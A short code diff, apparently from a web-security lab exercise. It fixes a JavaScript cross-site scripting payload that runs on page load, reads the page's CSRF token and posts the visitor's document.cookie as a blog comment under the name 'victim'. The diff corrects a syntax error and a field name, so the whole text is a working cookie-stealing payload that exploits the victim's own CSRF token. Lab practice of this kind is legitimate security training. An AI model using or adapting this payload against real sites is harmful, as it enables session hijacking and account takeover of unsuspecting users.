@@ -2,12 +2,12 @@
 window.addEventListener('DOMContentLoaded', function(){
 
 var token = document.getElementsByName('csrf')[0].value;
-var data\ = new FormData();
+var data = new FormData();
 
 data.append('csrf', token);
 data.append('postId', 6);
 data.append('comment', document.cookie);
-data.append('email', 'victim');
+data.append('name', 'victim');
 data.append('email', 'hello@gmail.com');
 data.append('website', 'http://hello.com');
 
